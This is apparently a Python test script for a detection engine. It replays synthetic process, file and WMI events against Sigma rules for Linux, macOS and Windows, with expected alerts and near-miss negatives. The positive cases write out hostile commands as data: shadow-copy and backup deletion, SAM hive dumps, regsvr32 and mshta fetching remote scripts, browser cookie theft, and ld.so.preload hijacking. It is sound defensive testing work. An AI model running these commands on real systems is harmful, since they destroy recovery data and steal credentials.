"""Negative evidence for the Essential rules that no other replay covers (#44, #43).

Every case is a synthetic event for one rule. Positives anchor the rule so a
negative can't pass merely because the rule never fires; the negatives are the
near misses an administrator, a package manager or an unrelated tool produces.
Each rule is replayed alone, so one rule can't shadow another.

Essential rules whose negatives live elsewhere are listed in COVERED_ELSEWHERE;
tools/validate.py-adjacent unit test `tests/tools/test_essential_negatives.py`
fails when an Essential Sigma rule is in neither place.
"""

import argparse
import hashlib
import json
import shutil
import subprocess
import tempfile
from pathlib import Path

SYS = "C:\\Windows\\System32\\"
WMI_PUT = r"Start IWbemServices::PutInstance - root\subscription : "
WMI_QUERY = r"Start IWbemServices::ExecQuery - root\cimv2 : "
OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def proc(image, cmd, parent=None):
    fields = {"Image": image, "CommandLine": cmd}
    if parent:
        fields["ParentImage"] = parent
    return {"category": "Process", "event_id": 1, "fields": fields}


def file(image, path):
    return {"category": "File", "event_id": 11, "fields": {"Image": image, "TargetFilename": path}}


def wmi(operation):
    return {"category": "Wmi", "event_id": 5858, "fields": {"Operation": operation}}


def win(parent, image):
    return proc(image, image.rsplit("\\", 1)[-1], parent)


# platform -> rule file -> [(alerts, event)]
CASES = {
    "linux": {
        "file_event_lnx_ldso_preload_hijack.yml": [
            (True, file("/bin/sh", "/etc/ld.so.preload")),
            (True, file("/usr/bin/python3", "/etc/ld.so.preload")),
            (False, file("/sbin/ldconfig", "/etc/ld.so.cache")),
            (False, file("/bin/sh", "/etc/ld.so.conf.d/libc.conf")),
            (False, file("/bin/sh", "/etc/ld.so.preload.bak")),
            (False, file("/bin/sh", "/etc/ld.so.preload.d/notes")),
        ],
        "proc_creation_lnx_webserver_spawns_shell.yml": [
            (True, proc("/bin/sh", "sh -c id", "/usr/sbin/nginx")),
            (True, proc("/bin/bash", "bash -i", "/usr/sbin/php-fpm8.2")),
            (True, proc("/usr/bin/python3.12", "python3 x.py", "/usr/sbin/apache2")),
            (False, proc("/usr/bin/ls", "ls /var/www", "/usr/sbin/nginx")),
            (False, proc("/usr/sbin/nginx", "nginx -t", "/usr/sbin/nginx")),
            (False, proc("/bin/bash", "bash", "/usr/bin/phpize")),
            (False, proc("/bin/bash", "bash", "/usr/bin/sshd")),
            (False, proc("/usr/bin/pythonw-helper", "x", "/usr/sbin/nginx")),
            (False, proc("/bin/bash", "bash", "/usr/bin/bash")),
        ],
    },
    "macos": {
        "proc_creation_macos_browser_credential_theft.yml": [
            (True, proc("/usr/bin/sqlite3", "sqlite3 /Users/a/Library/x/Login Data .dump")),
            (True, proc("/bin/cp", "cp /Users/a/Library/Cookies/Cookies.binarycookies /tmp/c")),
            (True, proc("/usr/bin/rsync", "rsync ~/Library/Firefox/p/key4.db /tmp")),
            (False, proc("/usr/bin/sqlite3", "sqlite3 /Users/a/app/data.db .tables")),
            (False, proc("/bin/cp", "cp /tmp/a.txt /tmp/b.txt")),
            (False, proc("/bin/ls", "ls -l /Users/a/Library/Cookies/Cookies.binarycookies")),
            (False, proc("/usr/bin/mdfind", "mdfind logins.json")),
        ],
    },
    "windows": {
        "proc_creation_win_susp_shadow_copy_deletion.yml": [
            (True, proc(SYS + "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet")),
            (True, proc(SYS + "wbem\\wmic.exe", "wmic.exe shadowcopy delete")),
            (False, proc(SYS + "vssadmin.exe", "vssadmin.exe list shadows")),
            (False, proc(SYS + "vssadmin.exe", "vssadmin.exe create shadow /for=C:")),
            (False, proc(SYS + "vssadmin.exe", "vssadmin.exe resize shadowstorage /for=C:")),
            (False, proc(SYS + "wbem\\wmic.exe", "wmic.exe shadowcopy list brief")),
            (False, proc(SYS + "cmd.exe", "cmd.exe /c echo vssadmin delete shadows")),
        ],
        "proc_creation_win_susp_regsvr32_remote_scriptlet.yml": [
            (
                True,
                proc(
                    SYS + "regsvr32.exe", "regsvr32.exe /s /n /u /i:http://x.test/a.sct scrobj.dll"
                ),
            ),
            (True, proc(SYS + "regsvr32.exe", "regsvr32.exe /s /i:ftp://x.test/a.sct scrobj.dll")),
            (
                False,
                proc(SYS + "regsvr32.exe", r"regsvr32.exe /s C:\Windows\System32\vbscript.dll"),
            ),
            (
                False,
                proc(SYS + "regsvr32.exe", r'regsvr32.exe /u /s "C:\Program Files\App\app.dll"'),
            ),
            (False, proc(SYS + "notepad.exe", "notepad.exe scrobj.txt")),
        ],
        "proc_creation_win_susp_mshta_remote_execution.yml": [
            (True, proc(SYS + "mshta.exe", "mshta.exe http://x.test/a.hta")),
            (True, proc(SYS + "mshta.exe", 'mshta.exe vbscript:Execute("x")(window.close)')),
            (True, proc(SYS + "mshta.exe", "mshta.exe javascript:a=1;close()")),
            (False, proc(SYS + "mshta.exe", r"mshta.exe C:\Program Files\App\legacy.hta")),
            (False, proc(SYS + "cmd.exe", "cmd.exe /c echo mshta http://x.test/a.hta")),
            (
                False,
                proc(r"C:\Program Files\Google\Chrome\chrome.exe", "chrome.exe https://x.test"),
            ),
        ],
        "proc_creation_win_susp_office_spawning_shell.yml": [
            (True, win(OFFICE + "WINWORD.EXE", SYS + "cmd.exe")),
            (True, win(OFFICE + "OUTLOOK.EXE", SYS + "WindowsPowerShell\\v1.0\\powershell.exe")),
            (True, win(OFFICE + "EXCEL.EXE", SYS + "mshta.exe")),
            (False, win(OFFICE + "WINWORD.EXE", r"C:\Windows\System32\splwow64.exe")),
            (False, win(OFFICE + "EXCEL.EXE", OFFICE + "ai.exe")),
            (False, win(r"C:\Windows\explorer.exe", SYS + "cmd.exe")),
            (False, win(r"C:\tools\notwinword.exe", SYS + "cmd.exe")),
        ],
        "proc_creation_win_susp_registry_hive_dump.yml": [
            (True, proc(SYS + "reg.exe", r"reg.exe save HKLM\SAM C:\s.hiv")),
            (True, proc(SYS + "reg.exe", r"reg.exe save hklm\system C:\s.hiv /y")),
            (True, proc(SYS + "reg.exe", r"reg.exe save HKLM\SECURITY C:\s.hiv")),
            (False, proc(SYS + "reg.exe", r"reg.exe query HKLM\SYSTEM\CurrentControlSet")),
            (False, proc(SYS + "reg.exe", r"reg.exe save HKCU\Software\App C:\app.hiv")),
            (False, proc(SYS + "reg.exe", r"reg.exe export HKLM\SYSTEM\Setup C:\setup.reg")),
            (
                False,
                proc(
                    SYS + "reg.exe",
                    r"reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SaveDumpStart",
                ),
            ),
            (False, proc(SYS + "cmd.exe", r"cmd.exe /c echo reg save hklm\sam")),
        ],
        "proc_creation_win_susp_uac_bypass_autoelevate.yml": [
            (True, win(SYS + "fodhelper.exe", SYS + "cmd.exe")),
            (True, win(SYS + "eventvwr.exe", SYS + "WindowsPowerShell\\v1.0\\powershell.exe")),
            (False, win(SYS + "eventvwr.exe", SYS + "mmc.exe")),
            (False, win(SYS + "fodhelper.exe", SYS + "conhost.exe")),
            (
                False,
                win(
                    SYS + "computerdefaults.exe",
                    r"C:\Windows\ImmersiveControlPanel\SystemSettings.exe",
                ),
            ),
            (False, win(r"C:\Windows\explorer.exe", SYS + "cmd.exe")),
        ],
        "wmi_event_win_susp_subscription.yml": [
            (
                True,
                wmi(WMI_PUT + "CommandLineEventConsumer"),
            ),
            (
                True,
                wmi(r"Provider::DeleteInstance - root\subscription : __FilterToConsumerBinding"),
            ),
            (
                False,
                wmi(WMI_QUERY + "SELECT * FROM Win32_OperatingSystem"),
            ),
            (
                False,
                wmi(r"Start IWbemServices::ExecQuery - root\cimv2 : SELECT * FROM Win32_Process"),
            ),
            (False, wmi(r"Start IWbemServices::GetObject - root\cimv2 : Win32_ComputerSystem")),
        ],
        "proc_creation_win_susp_bcdedit_recovery_tamper.yml": [
            (True, proc(SYS + "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled no")),
            (True, proc(SYS + "wbadmin.exe", "wbadmin.exe delete catalog -quiet")),
            (
                True,
                proc(SYS + "wbadmin.exe", "wbadmin.exe delete systemstatebackup -keepVersions:0"),
            ),
            (False, proc(SYS + "bcdedit.exe", "bcdedit.exe /enum")),
            (False, proc(SYS + "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled yes")),
            (False, proc(SYS + "wbadmin.exe", "wbadmin.exe get versions")),
            (
                False,
                proc(SYS + "wbadmin.exe", "wbadmin.exe start backup -backupTarget:E: -include:C:"),
            ),
            (False, proc(SYS + "cmd.exe", "cmd.exe /c echo bcdedit recoveryenabled no")),
        ],
        "proc_creation_win_susp_fsutil_usn_delete.yml": [
            (True, proc(SYS + "fsutil.exe", "fsutil.exe usn deletejournal /d C:")),
            (False, proc(SYS + "fsutil.exe", "fsutil.exe usn queryjournal C:")),
            (False, proc(SYS + "fsutil.exe", "fsutil.exe fsinfo drives")),
            (False, proc(SYS + "fsutil.exe", "fsutil.exe usn readjournal C:")),
            (False, proc(SYS + "cmd.exe", "cmd.exe /c echo fsutil usn deletejournal")),
        ],
    },
}

# Essential Sigma rules whose negative evidence is in another replay or atomic.
NEG = "tests/atomic/atomics/windows"
COVERED_ELSEWHERE = {
    "file_event_lnx_ssh_authorized_keys.yml": "tests/replay/linux_detection_logic.py",
    "file_event_lnx_sudoers_tamper.yml": "tests/replay/linux_detection_logic.py",
    "file_event_lnx_sshd_config_tamper.yml": "tests/replay/linux_detection_logic.py",
    "proc_creation_lnx_shell_dev_tcp_reverse_shell.yml": "tests/replay/linux_detection_logic.py",
    "proc_creation_lnx_nc_exec_reverse_shell.yml": "tests/replay/linux_detection_logic.py",
    "proc_creation_lnx_kmod_load_susp_path.yml": "tests/replay/linux_detection_logic.py",
    "proc_creation_lnx_backdoor_account.yml": "tests/replay/linux_detection_logic.py",
    "proc_creation_macos_keychain_dump_security.yml": "tests/replay/macos_detection_logic.py",
    "proc_creation_macos_osascript_admin_prompt.yml": "tests/replay/macos_detection_logic.py",
    "proc_creation_macos_gatekeeper_bypass.yml": "tests/replay/macos_detection_logic.py",
    "proc_creation_macos_shell_dev_tcp_reverse_shell.yml": "tests/replay/macos_detection_logic.py",
    "proc_creation_win_susp_encoded_powershell.yml": "tests/replay/windows_process.py",
    "proc_creation_win_susp_lsass_comsvcs_minidump.yml": "tests/replay/windows_process.py",
    "proc_creation_win_susp_eventlog_clear.yml": "tests/replay/windows_process.py",
    "proc_creation_win_susp_ntds_dit_extraction.yml": "tests/replay/windows_process.py",
    "proc_creation_win_susp_procdump_lsass.yml": "tests/replay/windows_process.py",
    "registry_event_win_defender_tamper.yml": f"{NEG}/defender_registry_tamper_negative.ps1",
    "registry_event_win_wdigest_cleartext_credentials.yml": f"{NEG}/wdigest_registry_negative.ps1",
    "registry_event_win_susp_ifeo_debugger.yml": f"{NEG}/ifeo_debugger_negative.ps1",
}


def title_of(path):
    for line in path.read_text().splitlines():
        if line.startswith("title:"):
            return line.split(":", 1)[1].strip().strip("'\"")
    raise ValueError(path)


def replay(engine, repo, platform, rule_file, cases):
    provider = {"linux": "ebpf", "macos": "esf", "windows": "etw"}[platform]
    timestamp = "2026-10-08T08:00:00Z"
    events, expected = [], set()
    for index, (alerts, event) in enumerate(cases, 1):
        event = json.loads(json.dumps(event))
        event["fields"]["ProcessId"] = str(index)
        event.update(
            event_time=timestamp, ingest_seq=index, platform=platform, provider=provider, opcode=1
        )
        events.append(event)
        if alerts:
            expected.add(index)
    source = next((repo / "rules/sigma" / platform).glob(rule_file))
    title = title_of(source)
    with tempfile.TemporaryDirectory(prefix="rustinel-essential-negatives-") as directory:
        root = Path(directory)
        rules = root / "sigma"
        rules.mkdir()
        shutil.copyfile(source, rules / source.name)
        payload = root / "cases.ndjson"
        data = "".join(json.dumps(event) + "\n" for event in events).encode()
        payload.write_bytes(data)
        engine_version = json.loads((repo / "compatibility/engine.json").read_text())["version"]
        payload.with_suffix(".manifest.json").write_text(
            json.dumps(
                {
                    "schema_version": 2,
                    "payload": payload.name,
                    "rustinel_version": engine_version,
                    "platform": platform,
                    "started_at": timestamp,
                    "ended_at": timestamp,
                    "status": "complete",
                    "events": {
                        "received": len(events),
                        "written": len(events),
                        "lost": 0,
                        "source_lost": 0,
                    },
                    "payload_bytes": len(data),
                    "payload_sha256": hashlib.sha256(data).hexdigest(),
                }
            )
        )
        config = root / "config.toml"
        config.write_text(
            f"[scanner]\nsigma_rules_path = {json.dumps(str(rules))}\n"
            'sigma_match_mode = "all"\nyara_enabled = false\n'
            "[ioc]\nenabled = false\n[dedup]\nenabled = false\n"
            f"[logging]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
            f"[alerts]\ndirectory = {json.dumps(str(root / 'logs'))}\n"
        )
        output = root / "alerts.ndjson"
        subprocess.run(
            [str(engine), "replay", str(payload), "--config", str(config), "--output", str(output)],
            check=True,
            timeout=60,
            capture_output=True,
        )
        alerts = [json.loads(line) for line in output.read_text().splitlines()]
        actual = {int(a["process.pid"]) for a in alerts if a["rule.name"] == title}
        if actual != expected:
            raise RuntimeError(
                f"{title}: missing alerts for cases {sorted(expected - actual)}; "
                f"unexpected alerts for cases {sorted(actual - expected)}"
            )
    return len(expected)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--engine", required=True, type=Path)
    parser.add_argument("--platform", choices=sorted(CASES), help="only this platform")
    args = parser.parse_args()
    engine = args.engine.resolve()
    repo = Path(__file__).resolve().parents[2]
    total = positives = 0
    for platform, rules in CASES.items():
        if args.platform and platform != args.platform:
            continue
        for rule_file, cases in rules.items():
            positives += replay(engine, repo, platform, rule_file, cases)
            total += len(cases)
    print(f"Passed {total} Essential replay cases ({positives} expected alerts).")


if __name__ == "__main__":
    main()
